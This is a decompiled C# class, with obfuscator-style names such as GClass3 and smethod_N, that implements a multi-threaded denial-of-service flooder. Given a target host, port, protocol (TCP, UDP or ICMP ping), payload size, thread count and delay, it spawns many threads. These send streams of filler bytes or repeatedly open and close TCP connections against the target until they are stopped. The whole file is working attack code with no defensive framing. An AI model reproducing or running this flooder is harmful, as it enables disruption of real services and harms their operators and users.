using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class GClass3
{
	private readonly string string_0 = "";

	private readonly int int_0;

	private readonly int int_1;

	private readonly int int_2;

	private readonly int int_3;

	private readonly int int_4;

	private const int int_5 = 0;

	private const int int_6 = 1;

	private const int int_7 = 2;

	private const int int_8 = 3;

	private Thread thread_0;

	private bool bool_0;

	public int int_9;

	private string string_1 = string.Empty;

	public GClass3(string string_2, string string_3, string string_4, string string_5, string string_6, string string_7)
	{
		string_0 = string_2;
		int_0 = int.Parse(string_3);
		if (!GClass3.smethod_0(string_4, "TCP"))
		{
			if (!GClass3.smethod_0(string_4, "UDP"))
			{
				if (GClass3.smethod_0(string_4, "ICMP ECHO (Ping)"))
				{
					int_1 = 2;
				}
			}
			else
			{
				int_1 = 1;
			}
		}
		else
		{
			int_1 = 0;
		}
		int_2 = int.Parse(string_5);
		int_3 = int.Parse(string_6);
		int_4 = int.Parse(string_7);
	}

	public void method_0()
	{
		thread_0 = GClass3.smethod_1((ThreadStart)method_1);
		GClass3.smethod_2(thread_0);
	}

	private void method_1()
	{
		List<Thread> list = new List<Thread>();
		if (int_1 == 0)
		{
			for (int i = 0; i < int_3; i++)
			{
				Thread thread = GClass3.smethod_1((ThreadStart)method_6);
				GClass3.smethod_2(thread);
				list.Add(thread);
			}
		}
		if (int_1 == 1)
		{
			for (int j = 0; j < int_3; j++)
			{
				Thread thread2 = GClass3.smethod_1((ThreadStart)method_5);
				GClass3.smethod_2(thread2);
				list.Add(thread2);
			}
		}
		if (int_1 == 2)
		{
			for (int k = 0; k < int_3; k++)
			{
				Thread thread3 = GClass3.smethod_1((ThreadStart)method_4);
				GClass3.smethod_2(thread3);
				list.Add(thread3);
			}
		}
		if (int_1 == 3)
		{
			for (int l = 0; l < int_3; l++)
			{
				Thread thread4 = GClass3.smethod_1((ThreadStart)method_2);
				GClass3.smethod_2(thread4);
				list.Add(thread4);
			}
		}
		while (!bool_0)
		{
		}
		foreach (Thread item in list)
		{
			GClass3.smethod_3(item);
		}
		GClass3.smethod_3(thread_0);
	}

	private void method_2()
	{
		while (!bool_0)
		{
			try
			{
				IPEndPoint endPoint_;
				try
				{
					endPoint_ = GClass3.smethod_6(GClass3.smethod_5(GClass3.smethod_4(string_0))[0], int_0);
				}
				catch
				{
					endPoint_ = GClass3.smethod_6(GClass3.smethod_7(string_0), int_0);
				}
				Socket socket = GClass3.smethod_8(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				GClass3.smethod_9(socket, (EndPoint)endPoint_, (AsyncCallback)method_3, (object)socket);
				GClass3.smethod_10(200);
				GClass3.smethod_11(socket);
				GClass3.smethod_10(int_4);
			}
			catch
			{
			}
		}
	}

	private void method_3(IAsyncResult iasyncResult_0)
	{
		int_9++;
	}

	private void method_4()
	{
		while (!bool_0)
		{
			try
			{
				GClass3.smethod_15(GClass3.smethod_12(), byte_0: GClass3.smethod_14(GClass3.smethod_13(), method_7()), string_2: string_0, int_10: 1000);
				GClass3.smethod_10(int_4);
			}
			catch
			{
			}
		}
	}

	private void method_5()
	{
		while (!bool_0)
		{
			try
			{
				UdpClient udpClient_ = GClass3.smethod_16();
				GClass3.smethod_17(udpClient_, string_0, int_0);
				byte[] array = GClass3.smethod_14(GClass3.smethod_13(), method_7());
				GClass3.smethod_18(udpClient_, array, array.Length);
				GClass3.smethod_19(udpClient_);
				GClass3.smethod_10(int_4);
			}
			catch
			{
			}
		}
	}

	private void method_6()
	{
		while (!bool_0)
		{
			try
			{
				TcpClient tcpClient_ = GClass3.smethod_20();
				GClass3.smethod_21(tcpClient_, string_0, int_0);
				NetworkStream stream_ = GClass3.smethod_22(tcpClient_);
				byte[] array = GClass3.smethod_14(GClass3.smethod_13(), method_7());
				GClass3.smethod_23((Stream)stream_, array, 0, array.Length);
				GClass3.smethod_24((Stream)stream_);
				GClass3.smethod_25((Stream)stream_);
				GClass3.smethod_26(tcpClient_);
				GClass3.smethod_10(int_4);
			}
			catch
			{
			}
		}
	}

	private string method_7()
	{
		if (GClass3.smethod_27(string_1, string.Empty))
		{
			return string_1;
		}
		StringBuilder stringBuilder = GClass3.smethod_28();
		for (int i = 0; i < int_2; i++)
		{
			GClass3.smethod_29(stringBuilder, "A");
		}
		string_1 = GClass3.smethod_30((object)stringBuilder);
		return string_1;
	}

	public void method_8()
	{
		bool_0 = true;
	}

	static bool smethod_0(string string_2, string string_3)
	{
		return string_2 == string_3;
	}

	static Thread smethod_1(ThreadStart threadStart_0)
	{
		return new Thread(threadStart_0);
	}

	static void smethod_2(Thread thread_1)
	{
		thread_1.Start();
	}

	static void smethod_3(Thread thread_1)
	{
		thread_1.Abort();
	}

	static IPHostEntry smethod_4(string string_2)
	{
		return Dns.GetHostEntry(string_2);
	}

	static IPAddress[] smethod_5(IPHostEntry iphostEntry_0)
	{
		return iphostEntry_0.AddressList;
	}

	static IPEndPoint smethod_6(IPAddress ipaddress_0, int int_10)
	{
		return new IPEndPoint(ipaddress_0, int_10);
	}

	static IPAddress smethod_7(string string_2)
	{
		return IPAddress.Parse(string_2);
	}

	static Socket smethod_8(AddressFamily addressFamily_0, SocketType socketType_0, ProtocolType protocolType_0)
	{
		return new Socket(addressFamily_0, socketType_0, protocolType_0);
	}

	static IAsyncResult smethod_9(Socket socket_0, EndPoint endPoint_0, AsyncCallback asyncCallback_0, object object_0)
	{
		return socket_0.BeginConnect(endPoint_0, asyncCallback_0, object_0);
	}

	static void smethod_10(int int_10)
	{
		Thread.Sleep(int_10);
	}

	static void smethod_11(Socket socket_0)
	{
		socket_0.Close();
	}

	static Ping smethod_12()
	{
		return new Ping();
	}

	static Encoding smethod_13()
	{
		return Encoding.Unicode;
	}

	static byte[] smethod_14(Encoding encoding_0, string string_2)
	{
		return encoding_0.GetBytes(string_2);
	}

	static PingReply smethod_15(Ping ping_0, string string_2, int int_10, byte[] byte_0)
	{
		return ping_0.Send(string_2, int_10, byte_0);
	}

	static UdpClient smethod_16()
	{
		return new UdpClient();
	}

	static void smethod_17(UdpClient udpClient_0, string string_2, int int_10)
	{
		udpClient_0.Connect(string_2, int_10);
	}

	static int smethod_18(UdpClient udpClient_0, byte[] byte_0, int int_10)
	{
		return udpClient_0.Send(byte_0, int_10);
	}

	static void smethod_19(UdpClient udpClient_0)
	{
		udpClient_0.Close();
	}

	static TcpClient smethod_20()
	{
		return new TcpClient();
	}

	static void smethod_21(TcpClient tcpClient_0, string string_2, int int_10)
	{
		tcpClient_0.Connect(string_2, int_10);
	}

	static NetworkStream smethod_22(TcpClient tcpClient_0)
	{
		return tcpClient_0.GetStream();
	}

	static void smethod_23(Stream stream_0, byte[] byte_0, int int_10, int int_11)
	{
		stream_0.Write(byte_0, int_10, int_11);
	}

	static void smethod_24(Stream stream_0)
	{
		stream_0.Close();
	}

	static void smethod_25(Stream stream_0)
	{
		stream_0.Dispose();
	}

	static void smethod_26(TcpClient tcpClient_0)
	{
		tcpClient_0.Close();
	}

	static bool smethod_27(string string_2, string string_3)
	{
		return string_2 != string_3;
	}

	static StringBuilder smethod_28()
	{
		return new StringBuilder();
	}

	static StringBuilder smethod_29(StringBuilder stringBuilder_0, string string_2)
	{
		return stringBuilder_0.Append(string_2);
	}

	static string smethod_30(object object_0)
	{
		return object_0.ToString();
	}
}
